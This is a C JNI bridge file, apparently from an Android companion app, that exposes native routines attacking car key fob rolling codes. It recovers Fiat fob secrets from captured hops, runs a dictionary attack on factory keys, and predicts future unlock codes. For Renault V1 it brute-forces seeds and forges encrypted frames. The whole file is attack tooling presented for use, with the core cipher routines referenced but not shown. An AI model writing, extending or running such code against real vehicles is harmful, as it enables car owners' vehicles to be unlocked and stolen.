#include <jni.h>
#include <stdint.h>
#include "fiat_bridge.h"
#include "hitag2_seed.h"

extern int fiat_recover(uint32_t uid, int n, const int* btn, const int* ctrl,
                        const uint32_t* hop, int threads, uint8_t out[6]);
extern unsigned long long fiat_recover_scanned(void);

JNIEXPORT jbyteArray JNICALL
Java_com_foxfw_companion_NativeSolver_recover(JNIEnv* env, jobject thiz,
    jint uid, jintArray jbtn, jintArray jctrl, jlongArray jhop, jint threads) {
    (void)thiz;
    jsize n = (*env)->GetArrayLength(env, jhop);
    if (n < 2) return NULL;
    if (n > 8) n = 8;

    jint* btn = (*env)->GetIntArrayElements(env, jbtn, 0);
    jint* ctrl = (*env)->GetIntArrayElements(env, jctrl, 0);
    jlong* hop = (*env)->GetLongArrayElements(env, jhop, 0);

    int cb[8], cc[8];
    uint32_t ch[8];
    for (int i = 0; i < n; i++) { cb[i] = (int)btn[i]; cc[i] = (int)ctrl[i]; ch[i] = (uint32_t)hop[i]; }

    uint8_t out[6];
    int ok = fiat_recover((uint32_t)uid, n, cb, cc, ch, (int)threads, out);

    (*env)->ReleaseIntArrayElements(env, jbtn, btn, JNI_ABORT);
    (*env)->ReleaseIntArrayElements(env, jctrl, ctrl, JNI_ABORT);
    (*env)->ReleaseLongArrayElements(env, jhop, hop, JNI_ABORT);

    if (!ok) return NULL;
    jbyteArray res = (*env)->NewByteArray(env, 6);
    (*env)->SetByteArrayRegion(env, res, 0, 6, (const jbyte*)out);
    return res;
}

JNIEXPORT jlong JNICALL
Java_com_foxfw_companion_NativeSolver_scanned(JNIEnv* env, jobject thiz) {
    (void)env; (void)thiz;
    return (jlong)fiat_recover_scanned();
}

// Predict a hop from the recovered clone secret (key6 = {k4,k5,clone[31..0]}),
// given frame0's (btn,ctrl) for iv0 and the target (btn,ctrl).
JNIEXPORT jlong JNICALL
Java_com_foxfw_companion_NativeSolver_predict(JNIEnv* env, jobject thiz,
    jint uid, jbyteArray jkey, jint f0btn, jint f0ctrl, jint btn, jint ctrl) {
    (void)thiz;
    jbyte* k = (*env)->GetByteArrayElements(env, jkey, 0);
    int k4 = (uint8_t)k[0], k5 = (uint8_t)k[1];
    uint32_t cl = ((uint32_t)(uint8_t)k[2] << 24) | ((uint32_t)(uint8_t)k[3] << 16)
                | ((uint32_t)(uint8_t)k[4] << 8) | (uint32_t)(uint8_t)k[5];
    (*env)->ReleaseByteArrayElements(env, jkey, k, JNI_ABORT);
    int clone[32];
    for (int i = 0; i < 32; i++) clone[i] = (cl >> (31 - i)) & 1;
    uint32_t iv0 = fb_iv(f0btn, f0ctrl, 0);
    uint32_t hop = fb_predict_hop((uint32_t)uid, k4, k5, clone, iv0, btn, ctrl);
    return (jlong)(uint32_t)hop;
}

JNIEXPORT void JNICALL
Java_com_foxfw_companion_NativeSolver_cancel(JNIEnv* env, jobject thiz) {
    (void)env; (void)thiz;
    extern void fiat_recover_cancel(void);
    fiat_recover_cancel();
}

// Dictionary attack: try known factory keys x 2^18 epochs. On a hit returns a 10-byte array
// = absolute key[0..5] followed by the 4-byte epoch (big-endian); null on a miss.
JNIEXPORT jbyteArray JNICALL
Java_com_foxfw_companion_NativeSolver_dict(JNIEnv* env, jobject thiz,
    jint uid, jintArray jbtn, jintArray jctrl, jlongArray jhop, jint threads) {
    (void)thiz;
    extern int fiat_dict(uint32_t uid, int n, const int* btn, const int* ctrl,
                         const uint32_t* hop, int threads, uint8_t out[6], uint32_t* epoch);
    jsize n = (*env)->GetArrayLength(env, jhop);
    if (n < 2) return NULL;
    if (n > 8) n = 8;
    jint* btn = (*env)->GetIntArrayElements(env, jbtn, 0);
    jint* ctrl = (*env)->GetIntArrayElements(env, jctrl, 0);
    jlong* hop = (*env)->GetLongArrayElements(env, jhop, 0);
    int cb[8], cc[8];
    uint32_t ch[8];
    for (int i = 0; i < n; i++) { cb[i] = (int)btn[i]; cc[i] = (int)ctrl[i]; ch[i] = (uint32_t)hop[i]; }
    uint8_t key[6]; uint32_t epoch = 0;
    int ok = fiat_dict((uint32_t)uid, n, cb, cc, ch, (int)threads, key, &epoch);
    (*env)->ReleaseIntArrayElements(env, jbtn, btn, JNI_ABORT);
    (*env)->ReleaseIntArrayElements(env, jctrl, ctrl, JNI_ABORT);
    (*env)->ReleaseLongArrayElements(env, jhop, hop, JNI_ABORT);
    if (!ok) return NULL;
    jbyte buf[10];
    for (int i = 0; i < 6; i++) buf[i] = (jbyte)key[i];
    buf[6] = (jbyte)((epoch >> 24) & 0xFF); buf[7] = (jbyte)((epoch >> 16) & 0xFF);
    buf[8] = (jbyte)((epoch >> 8) & 0xFF);  buf[9] = (jbyte)(epoch & 0xFF);
    jbyteArray res = (*env)->NewByteArray(env, 10);
    (*env)->SetByteArrayRegion(env, res, 0, 10, buf);
    return res;
}

// Predict a hop from an ABSOLUTE key (dictionary result) + its epoch, for a target (btn,ctrl).
JNIEXPORT jlong JNICALL
Java_com_foxfw_companion_NativeSolver_predictKey(JNIEnv* env, jobject thiz,
    jint uid, jbyteArray jkey, jint epoch, jint btn, jint ctrl) {
    (void)thiz;
    jbyte* k = (*env)->GetByteArrayElements(env, jkey, 0);
    uint8_t key6[6];
    for (int i = 0; i < 6; i++) key6[i] = (uint8_t)k[i];
    (*env)->ReleaseByteArrayElements(env, jkey, k, JNI_ABORT);
    uint32_t hop = fb_output(fb_state_after_init((uint32_t)uid, btn, ctrl, key6, epoch));
    return (jlong)(uint32_t)hop;
}

// Dictionary progress (epochs tried).
JNIEXPORT jlong JNICALL
Java_com_foxfw_companion_NativeSolver_dictScanned(JNIEnv* env, jobject thiz) {
    (void)env; (void)thiz;
    extern unsigned long long fiat_dict_scanned(void);
    return (jlong)fiat_dict_scanned();
}

// --- Renault V1 "classic Hitag2 + SEED" model (seed->key, no secret key) ---------
// Recover the 4-byte IV/seed from an 11-byte Renault V1 wire frame (18-bit brute).
// Returns the 4-byte IV on success (seed/cnt/btn decode from it in Kotlin), null on miss.
JNIEXPORT jbyteArray JNICALL
Java_com_foxfw_companion_NativeSolver_seedRecover(JNIEnv* env, jobject thiz, jbyteArray jframe) {
    (void)thiz;
    jsize n = (*env)->GetArrayLength(env, jframe);
    if (n < 11) return NULL;
    jbyte* fb = (*env)->GetByteArrayElements(env, jframe, 0);
    uint8_t frame[11];
    for (int i = 0; i < 11; i++) frame[i] = (uint8_t)fb[i];
    (*env)->ReleaseByteArrayElements(env, jframe, fb, JNI_ABORT);
    uint8_t iv[4];
    if (!hitag2_seed_recover(frame, iv)) return NULL;
    jbyteArray res = (*env)->NewByteArray(env, 4);
    (*env)->SetByteArrayRegion(env, res, 0, 4, (const jbyte*)iv);
    return res;
}

// Forward-encode one Renault V1 frame from serial+cnt+btn+seed -> 11-byte frame.
JNIEXPORT jbyteArray JNICALL
Java_com_foxfw_companion_NativeSolver_seedForge(JNIEnv* env, jobject thiz,
    jint serial, jint cnt, jint btn, jint seed) {
    (void)thiz;
    uint8_t out[11], iv[4];
    hitag2_seed_encrypt_frame((uint32_t)serial, (uint32_t)cnt, (uint8_t)btn, (uint32_t)seed, out, iv);
    jbyteArray res = (*env)->NewByteArray(env, 11);
    (*env)->SetByteArrayRegion(env, res, 0, 11, (const jbyte*)out);
    return res;
}
